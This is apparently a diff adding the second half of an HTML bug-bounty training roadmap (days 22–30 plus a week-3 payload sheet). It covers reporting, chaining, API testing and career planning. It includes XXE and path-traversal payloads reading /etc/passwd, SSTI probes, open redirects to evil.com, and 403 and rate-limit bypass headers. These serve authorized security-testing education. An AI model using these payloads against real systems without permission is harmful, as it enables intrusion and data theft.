+              <div class="code">
+<span class="cm">── XXE: XML input accepted anywhere ──</span>
+<span class="hl">&lt;?xml version="1.0"?&gt;
+&lt;!DOCTYPE foo [&lt;!ENTITY xxe SYSTEM "file:///etc/passwd"&gt;]&gt;
+&lt;foo&gt;&amp;xxe;&lt;/foo&gt;</span>
+<span class="cm"># Trigger: XML file upload, SOAP API, SVG upload</span>
+
+<span class="cm">── SSTI: Template engines ──</span>
+<span class="hl">{{7*7}}</span>  <span class="cm"># Returns 49? → Jinja2/Twig SSTI</span>
+<span class="hl">${7*7}</span>  <span class="cm"># FreeMarker/Velocity</span>
+<span class="hl">#{7*7}</span>  <span class="cm"># Ruby ERB</span>
+<span class="cm"># Trigger: email templates, user-controlled fields in error pages</span>
+
+<span class="cm">── Open Redirect ──</span>
+?redirect=https://evil.com
+?url=//evil.com
+?next=\evil.com
+<span class="cm"># Impact: phishing, OAuth token theft</span>
+
+<span class="cm">── Path Traversal ──</span>
+?file=../../../etc/passwd
+?file=....//....//etc/passwd  <span class="cm"># bypass filter</span>
+?file=%2e%2e%2f%2e%2e%2fetc%2fpasswd  <span class="cm"># URL encoded</span>
+<span class="cm"># Trigger: file download, image load, log viewer</span>
+              </div>
+            </div>
+            <div class="section-block">
+              <div class="block-label lbl-teal">Week 3 Gate Check</div>
+              <div class="outcome-inline">✓ 15+ PortSwigger labs done · ✓ Tested IDOR/XSS/SQLi/SSRF on your program · ✓ Understand how to recognize trigger conditions for all 7 vuln classes · ✓ At least one potential finding documented with evidence</div>
+            </div>
+          </div>
+        </div>
+
+      </div>
+    </div><!-- /w3 -->
+
+
+    <!-- ══════════════════ WEEK 4 ══════════════════ -->
+    <div class="week-panel" id="w4">
+      <div class="week-hero">
+        <div class="week-meta">
+          <span class="week-phase-tag">Phase 3 · Live Hunting</span>
+          <span class="week-range">Days 22 – 30</span>
+        </div>
+        <h2>Hunt, Report &amp; Build Your Career</h2>
+        <p class="week-objective">Everything so far was preparation. This week you hunt live targets, write real reports, handle triage communication, chain vulnerabilities for higher impact, and build the reputation that creates long-term opportunities.</p>
+        <div class="outcome-box">
+          <span class="outcome-icon">🎯</span>
+          <div class="outcome-text">
+            <strong>Week 4 Outcome</strong>
+            You've submitted at least 1 bug report. You have a published write-up. Your HackerOne/Bugcrowd profile is complete with reputation points. You have a 90-day hunting plan beyond this program.
+          </div>
+        </div>
+      </div>
+
+      <div class="days-stack">
+
+        <!-- DAY 22 -->
+        <div class="day-card" id="d22">
+          <div class="day-header" onclick="toggleDay('d22')">
+            <span class="day-num">DAY 22</span>
+            <div class="day-checkbox" onclick="checkDay(event,'d22')">✓</div>
+            <div class="day-title-wrap">
+              <div class="day-title">Writing Bug Reports That Get Paid — Not Closed</div>
+              <div class="day-sub">Report structure, impact narrative, CVSS, reproduction steps</div>
+            </div>
+            <div class="day-tags"><span class="tag tag-report">Reporting</span></div>
+            <span class="chevron">▼</span>
+          </div>
+          <div class="day-body">
+            <div class="section-block">
+              <div class="block-label lbl-amber">What &amp; Why</div>
+              <p class="prose">A valid bug with a poor report gets downgraded or closed. The triage team receives hundreds of submissions — yours must be impossible to misunderstand. Clear reproduction steps, undeniable impact, and professional communication are the difference between $0 and $2,000.</p>
+            </div>
+            <div class="section-block">
+              <div class="block-label lbl-blue">The Anatomy of a Paid Report</div>
+              <div class="code">
+<span class="hl">Title:</span> [IDOR] Any authenticated user can access and modify other users' private billing information via /api/v2/billing/{user_id}
+
+<span class="hl">Summary:</span>
+An IDOR vulnerability in the billing API allows authenticated users to read and modify billing details of any other user by manipulating the user_id parameter. No additional authorization is performed server-side.
+
+<span class="hl">Severity:</span> High (CVSS 8.1)
+
+<span class="hl">Steps to Reproduce:</span>
+1. Log in as User A (attacker@test.com)
+2. Navigate to Billing Settings — intercept with Burp Suite
+3. Observe GET request: /api/v2/billing/<span class="tl">12345</span> (your user_id)
+4. Send to Repeater. Change 12345 to <span class="tl">12344</span> (victim's user_id)
+5. Response returns victim's full name, credit card last 4, billing address
+
+<span class="hl">Impact:</span>
+Any authenticated attacker can enumerate all user billing information, including PII and partial payment data. This violates PCI-DSS compliance requirements and exposes the company to significant regulatory risk. At scale, this could be automated to extract the entire user billing database.
+
+<span class="hl">Evidence:</span>
+[Screenshot 1: Request with victim user_id]
+[Screenshot 2: Response showing victim's billing data]
+[Screenshot 3: Victim's actual account showing matching data]
+
+<span class="hl">Remediation:</span>
+Enforce server-side authorization on every /api/v2/billing/{id} request. Verify the authenticated user's session matches the requested user_id before returning data.
+              </div>
+            </div>
+          </div>
+        </div>
+
+        <!-- DAY 23 -->
+        <div class="day-card" id="d23">
+          <div class="day-header" onclick="toggleDay('d23')">
+            <span class="day-num">DAY 23</span>
+            <div class="day-checkbox" onclick="checkDay(event,'d23')">✓</div>
+            <div class="day-title-wrap">
+              <div class="day-title">Vulnerability Chaining — Turn Low Bugs Into Criticals</div>
+              <div class="day-sub">Combining multiple weaknesses for maximum impact</div>
+            </div>
+            <div class="day-tags"><span class="tag tag-live">Advanced</span><span class="tag tag-live">High Payout</span></div>
+            <span class="chevron">▼</span>
+          </div>
+          <div class="day-body">
+            <div class="section-block">
+              <div class="block-label lbl-amber">What &amp; Why</div>
+              <p class="prose">A Self-XSS alone is usually P4 ($0). A CSRF that triggers the Self-XSS is P2 ($500-2000). Add an Open Redirect to deliver the CSRF payload and you have a P1 account takeover chain. Chaining is how you turn three $0 findings into one $5,000 report.</p>
+            </div>
+            <div class="section-block">
+              <div class="block-label lbl-blue">Classic Chains to Know</div>
+              <ul class="items">
+                <li><strong>Self-XSS + CSRF = Stored XSS:</strong> Use CSRF to make victim trigger the XSS in their own profile</li>
+                <li><strong>Open Redirect + OAuth = Account Takeover:</strong> Redirect OAuth token to attacker domain</li>
+                <li><strong>SSRF + Internal Redis = RCE:</strong> SSRF to internal Redis → write cron job → command execution</li>
+                <li><strong>Path Traversal + File Write = RCE:</strong> Write webshell via path traversal</li>
+                <li><strong>Subdomain Takeover + Stored XSS = Session Hijack:</strong> Host malicious content on taken-over subdomain</li>
+                <li><strong>IDOR + PII + Unauthenticated Access = Critical Data Breach:</strong> IDOR on endpoint that's also missing auth</li>
+              </ul>
+            </div>
+            <div class="section-block">
+              <div class="block-label lbl-teal">Practice Task</div>
+              <div class="outcome-inline">Take your list of lower-severity potential findings. For each one, ask: what other weakness could I chain this with to escalate impact? Map possible chains in your notes before testing them.</div>
+            </div>
+          </div>
+        </div>
+
+        <!-- DAY 24 -->
+        <div class="day-card" id="d24">
+          <div class="day-header" onclick="toggleDay('d24')">
+            <span class="day-num">DAY 24</span>
+            <div class="day-checkbox" onclick="checkDay(event,'d24')">✓</div>
+            <div class="day-title-wrap">
+              <div class="day-title">API Security Testing — Where Modern Bugs Live</div>
+              <div class="day-sub">REST, GraphQL, hidden endpoints, mass assignment</div>
+            </div>
+            <div class="day-tags"><span class="tag tag-vuln">Vuln</span><span class="tag tag-tool">Tools</span></div>
+            <span class="chevron">▼</span>
+          </div>
+          <div class="day-body">
+            <div class="section-block">
+              <div class="block-label lbl-amber">What &amp; Why</div>
+              <p class="prose">Modern apps are 80% API. The web UI is just a pretty front-end — the real logic is in the API. API endpoints often have weaker authentication, less input validation, and better attack surface density than the web front-end.</p>
+            </div>
+            <div class="section-block">
+              <div class="block-label lbl-blue">API Testing Checklist</div>
+              <ul class="items">
+                <li><strong>Find the API docs:</strong> /api/docs, /swagger.json, /api-docs, /openapi.json — read every endpoint</li>
+                <li><strong>GraphQL introspection:</strong> Run query to dump full schema, find hidden mutations</li>
+                <li><strong>HTTP method switching:</strong> GET /api/users → try DELETE, PUT, PATCH</li>
+                <li><strong>Version downgrade:</strong> /api/v3/user → try /api/v1/user — older versions often lack auth</li>
+                <li><strong>Mass assignment:</strong> Add unexpected fields to POST bodies — "role":"admin", "verified":true</li>
+                <li><strong>Missing auth on actions:</strong> Does deleting via API require auth? Test without Authorization header.</li>
+              </ul>
+            </div>
+            <div class="section-block">
+              <div class="block-label lbl-blue">GraphQL Introspection</div>
+              <div class="code">
+<span class="cm"># Test if introspection is enabled</span>
+{"query": "{__schema{types{name}}}"}
+
+<span class="cm"># Full schema dump</span>
+{"query": "{__schema{queryType{name} mutationType{name} types{name kind fields{name args{name type{name kind ofType{name kind}}}}}}}"}
+
+<span class="cm"># Use GraphQL Voyager to visualize the schema</span>
+<span class="cm"># Look for: admin mutations, delete operations, unauthenticated queries</span>
+              </div>
+            </div>
+          </div>
+        </div>
+
+        <!-- DAY 25 -->
+        <div class="day-card" id="d25">
+          <div class="day-header" onclick="toggleDay('d25')">
+            <span class="day-num">DAY 25</span>
+            <div class="day-checkbox" onclick="checkDay(event,'d25')">✓</div>
+            <div class="day-title-wrap">
+              <div class="day-title">403 Bypass, Rate Limit Bypass &amp; Filter Evasion</div>
+              <div class="day-sub">Get past the controls that block basic testing</div>
+            </div>
+            <div class="day-tags"><span class="tag tag-vuln">Bypass</span><span class="tag tag-tool">Tools</span></div>
+            <span class="chevron">▼</span>
+          </div>
+          <div class="day-body">
+            <div class="section-block">
+              <div class="block-label lbl-blue">403 Bypass Techniques</div>
+              <div class="code">
+<span class="cm"># Path manipulation</span>
+/admin/          → /%2fadmin/
+/admin/          → /admin;/
+/admin/          → /ADMIN/
+/admin/secret    → /admin/./secret
+/admin/secret    → /admin//secret
+
+<span class="cm"># Header injection bypasses</span>
+X-Original-URL: /admin/
+X-Rewrite-URL: /admin/
+X-Forwarded-For: 127.0.0.1
+X-Custom-IP-Authorization: 127.0.0.1
+X-Host: 127.0.0.1
+
+<span class="cm"># Rate limit bypass (when limited by IP)</span>
+X-Forwarded-For: <span class="hl">random_ip</span>    <span class="cm"># rotate each request</span>
+X-Real-IP: <span class="hl">random_ip</span>
+True-Client-IP: <span class="hl">random_ip</span>
+
+<span class="cm"># Rate limit bypass (when limited by account)</span>
+<span class="cm"># Use email+tricks: victim@gmail.com = victim+1@gmail.com = v.ictim@gmail.com</span>
+              </div>
+            </div>
+          </div>
+        </div>
+
+        <!-- DAY 26 -->
+        <div class="day-card" id="d26">
+          <div class="day-header" onclick="toggleDay('d26')">
+            <span class="day-num">DAY 26</span>
+            <div class="day-checkbox" onclick="checkDay(event,'d26')">✓</div>
+            <div class="day-title-wrap">
+              <div class="day-title">Live Hunt Day — Full Day on Your Target</div>
+              <div class="day-sub">Apply everything. Document everything. Submit what you find.</div>
+            </div>
+            <div class="day-tags"><span class="tag tag-live">Live Hunt</span></div>
+            <span class="chevron">▼</span>
+          </div>
+          <div class="day-body">
+            <div class="section-block">
+              <div class="block-label lbl-amber">Today's Structure</div>
+              <ul class="items">
+                <li><strong>Hour 1:</strong> Run your recon.sh script on your target — review any new endpoints since your last run</li>
+                <li><strong>Hour 2-3:</strong> Manual testing — focus on one feature area (authentication, file handling, or API)</li>
+                <li><strong>Hour 4:</strong> Dig into any promising findings — attempt chaining, verify impact fully</li>
+                <li><strong>Hour 5:</strong> Write up any confirmed finding using your Day 22 report template</li>
+                <li><strong>Hour 6:</strong> Submit — or mark as "needs more evidence" in your notes</li>
+              </ul>
+            </div>
+            <div class="section-block">
+              <div class="block-label lbl-red">Remember</div>
+              <div class="warn-inline">Don't submit findings you haven't fully verified. Don't test out-of-scope assets. Don't use automated scanners that could DoS the target. Document your test account credentials used for evidence.</div>
+            </div>
+            <div class="section-block">
+              <div class="block-label lbl-teal">Outcome</div>
+              <div class="outcome-inline">By end of day: at least 1 report submitted OR 3 potential findings fully documented with reproduction steps ready to submit tomorrow after a second review.</div>
+            </div>
+          </div>
+        </div>
+
+        <!-- DAY 27 -->
+        <div class="day-card" id="d27">
+          <div class="day-header" onclick="toggleDay('d27')">
+            <span class="day-num">DAY 27</span>
+            <div class="day-checkbox" onclick="checkDay(event,'d27')">✓</div>
+            <div class="day-title-wrap">
+              <div class="day-title">Handling Triage — Communication That Preserves Reputation</div>
+              <div class="day-sub">Duplicates, N/A responses, severity disputes, professional pushback</div>
+            </div>
+            <div class="day-tags"><span class="tag tag-report">Reporting</span><span class="tag tag-mindset">Mindset</span></div>
+            <span class="chevron">▼</span>
+          </div>
+          <div class="day-body">
+            <div class="section-block">
+              <div class="block-label lbl-amber">The Responses You'll Get (and How to Handle Them)</div>
+              <ul class="items">
+                <li><strong>Duplicate:</strong> Happens constantly. Don't argue. Ask if you can see the original once resolved. Learn what was already found and move on faster.</li>
+                <li><strong>N/A — out of scope:</strong> Re-read scope carefully. If you genuinely believe it's in scope, politely quote the relevant policy section. Don't argue without evidence.</li>
+                <li><strong>Severity downgrade:</strong> Calculate CVSS yourself. If they rate P3 and you believe P2, write a factual rebuttal explaining real-world impact. Use concrete examples.</li>
+                <li><strong>Needs more info:</strong> Respond within 24 hours. Provide a more detailed PoC, video recording, or alternative reproduction steps.</li>
+                <li><strong>Won't fix / Informational:</strong> Accept gracefully. Note it for your portfolio. Some programs pay for informational findings on VDPs.</li>
+              </ul>
+            </div>
+            <div class="section-block">
+              <div class="block-label lbl-red">Never Do This</div>
+              <div class="warn-inline">Never threaten disclosure. Never be rude to triagers. Never publicly disclose before the program's disclosure timeline. Never exploit a finding beyond what's necessary to prove impact. These behaviors permanently destroy your reputation in the community.</div>
+            </div>
+          </div>
+        </div>
+
+        <!-- DAY 28 -->
+        <div class="day-card" id="d28">
+          <div class="day-header" onclick="toggleDay('d28')">
+            <span class="day-num">DAY 28</span>
+            <div class="day-checkbox" onclick="checkDay(event,'d28')">✓</div>
+            <div class="day-title-wrap">
+              <div class="day-title">Write Your First Public Write-Up</div>
+              <div class="day-sub">Structure, what to include, where to publish, community building</div>
+            </div>
+            <div class="day-tags"><span class="tag tag-report">Reporting</span><span class="tag tag-live">Career</span></div>
+            <span class="chevron">▼</span>
+          </div>
+          <div class="day-body">
+            <div class="section-block">
+              <div class="block-label lbl-amber">What &amp; Why</div>
+              <p class="prose">Public write-ups build your reputation faster than any certificate. Companies hire hunters they've seen write clearly about interesting bugs. A single well-written write-up has led to direct program invitations and job offers.</p>
+            </div>
+            <div class="section-block">
+              <div class="block-label lbl-blue">Write-Up Structure</div>
+              <ul class="items">
+                <li><strong>Introduction:</strong> What target, what you were looking for, what you found (don't spoil, tease it)</li>
+                <li><strong>Recon phase:</strong> What steps led you to this endpoint? The "how I found it" story</li>
+                <li><strong>Vulnerability details:</strong> Technical explanation with request/response snippets</li>
+                <li><strong>Impact:</strong> What could a real attacker do with this? Be specific</li>
+                <li><strong>Timeline:</strong> Report submitted → triaged → fixed → disclosed</li>
+                <li><strong>Lessons learned:</strong> What would you test differently next time?</li>
+              </ul>
+            </div>
+            <div class="section-block">
+              <div class="block-label lbl-blue">Where to Publish</div>
+              <ul class="items">
+                <li>Medium (most read by industry)</li>
+                <li>Your personal GitHub Pages site (professional portfolio)</li>
+                <li>HackerOne's "Thanks" page links to write-ups</li>
+                <li>InfoSec Twitter/X community — share with #bugbounty</li>
+              </ul>
+            </div>
+          </div>
+        </div>
+
+        <!-- DAY 29 -->
+        <div class="day-card" id="d29">
+          <div class="day-header" onclick="toggleDay('d29')">
+            <span class="day-num">DAY 29</span>
+            <div class="day-checkbox" onclick="checkDay(event,'d29')">✓</div>
+            <div class="day-title-wrap">
+              <div class="day-title">Specialization &amp; the 90-Day Plan Beyond This Program</div>
+              <div class="day-sub">Mobile, cloud, thick clients, Web3 — pick your niche</div>
+            </div>
+            <div class="day-tags"><span class="tag tag-live">Career</span><span class="tag tag-mindset">Strategy</span></div>
+            <span class="chevron">▼</span>
+          </div>
+          <div class="day-body">
+            <div class="section-block">
+              <div class="block-label lbl-amber">Where to Specialize</div>
+              <ul class="items">
+                <li><strong>Mobile (Android/iOS):</strong> Huge unmet demand. MobSF, Frida, jadx. Most hunters avoid mobile = less competition.</li>
+                <li><strong>Cloud Misconfigurations:</strong> S3 buckets, Azure blob, GCP IAM — huge impact, often missed by web-only hunters.</li>
+                <li><strong>Web3/Smart Contracts:</strong> Highest payouts in bug bounty history. Requires Solidity knowledge. Immunefi platform.</li>
+                <li><strong>API Security:</strong> Double down here — every company has APIs, most have misconfigs.</li>
+                <li><strong>Thick Client/Desktop:</strong> Least competed space. Tools: dnSpy, Procmon, Wireshark.</li>
+              </ul>
+            </div>
+            <div class="section-block">
+              <div class="block-label lbl-blue">Your 90-Day Plan Template</div>
+              <div class="code">
+Days 31-45:  Complete PortSwigger Academy (all topics)
+Days 46-60:  Add 2nd program, specialize in chosen area
+Days 61-75:  Attempt private program invitations (via HackerOne reputation)
+Days 76-90:  Apply to bug bounty-focused jobs OR increase program count to 3
+<span class="cm">
+Milestone targets:
+→ 5 resolved reports (any severity)
+→ 1 High or Critical finding
+→ HackerOne reputation > 500
+→ 3 published write-ups
+→ 1 private program invitation</span>
+              </div>
+            </div>
+          </div>
+        </div>
+
+        <!-- DAY 30 -->
+        <div class="day-card" id="d30">
+          <div class="day-header" onclick="toggleDay('d30')">
+            <span class="day-num">DAY 30</span>
+            <div class="day-checkbox" onclick="checkDay(event,'d30')">✓</div>
+            <div class="day-title-wrap">
+              <div class="day-title">Day 30 — Review, Reflect, and Lock In Your Path</div>
+              <div class="day-sub">Final audit of your skills, portfolio, and next steps</div>
+            </div>
+            <div class="day-tags"><span class="tag tag-live">Capstone</span></div>
+            <span class="chevron">▼</span>
+          </div>
+          <div class="day-body">
+            <div class="section-block">
+              <div class="block-label lbl-amber">Capstone Checklist</div>
+              <ul class="items">
+                <li>Count your disclosed reports + pending submissions</li>
+                <li>Review your recon.sh — what improvements would make it faster?</li>
+                <li>List the 3 vuln classes you're strongest in and 2 you need to go deeper on</li>
+                <li>Complete your HackerOne/Bugcrowd profile — photo, bio, skills, links to write-ups</li>
+                <li>Publish your write-up if not done on Day 28</li>
+                <li>Write your 90-day hunting plan in your notes</li>
+              </ul>
+            </div>
+            <div class="section-block">
+              <div class="block-label lbl-teal">Final Gate Check</div>
+              <div class="outcome-inline">
+                ✓ Lab running · ✓ recon.sh built · ✓ 15+ PortSwigger labs done · ✓ 1+ reports submitted · ✓ Write-up published · ✓ Profile complete · ✓ 90-day plan written<br><br>
+                You are no longer a beginner. You have the methodology, the tools, and the habit. The next 90 days of consistent hunting will define your results.
+              </div>
+            </div>
+            <div class="section-block">
+              <div class="block-label lbl-blue">Resources That Take You Further</div>
+              <div class="chips">
+                <span class="chip">portswigger.net/academy</span>
+                <span class="chip">pentester.land/writeups</span>
+                <span class="chip">hackerone.com/hacktivity</span>
+                <span class="chip">nahamsec on YouTube</span>
+                <span class="chip">STÖK on YouTube</span>
+                <span class="chip">Jason Haddix methodology</span>
+                <span class="chip">TCM Security courses</span>
+                <span class="chip">Bug Bounty Hunting Essentials (book)</span>
+              </div>
+            </div>
+          </div>
+        </div>
+
+      </div>
+    </div><!-- /w4 -->
+
+  </main>
+</div>
+
+<footer>
+  <span style="color:var(--amber)">BUG BOUNTY MASTERY</span> · 30-DAY ROADMAP · BUILT FOR HUNTERS<br>
+  <span style="margin-top:4px;display:block">Only test systems you have explicit permission to test. Unauthorized access is illegal.</span>
+</footer>
+
+<script>
+const completed = new Set();
+
+function toggleDay(id) {
+  const card = document.getElementById(id);
+  const isOpen = card.classList.contains('open');
+  // close all
+  document.querySelectorAll('.day-card').forEach(c => c.classList.remove('open'));
+  if (!isOpen) card.classList.add('open');
+}
+
+function checkDay(e, id) {
+  e.stopPropagation();
+  const card = document.getElementById(id);
+  if (completed.has(id)) {
+    completed.delete(id);
+    card.classList.remove('done');
+  } else {
+    completed.add(id);
+    card.classList.add('done');
+  }
+  updateProgress();
+}
+
+function updateProgress() {
+  const total = 30;
+  const done = completed.size;
+  const pct = Math.round((done / total) * 100);
+  document.getElementById('pfill').style.width = pct + '%';
+  document.getElementById('ppct').textContent = pct + '%';
+  document.getElementById('stat-done').textContent = done;
+}
+
+function showWeek(id, btn) {
+  document.querySelectorAll('.week-panel').forEach(p => p.classList.remove('visible'));
+  document.querySelectorAll('.week-btn').forEach(b => b.classList.remove('active'));
+  document.getElementById(id).classList.add('visible');
+  btn.classList.add('active');
+  // close all day cards on switch
+  document.querySelectorAll('.day-card').forEach(c => c.classList.remove('open'));
+}
+</script>
+
+</body>
+</html>
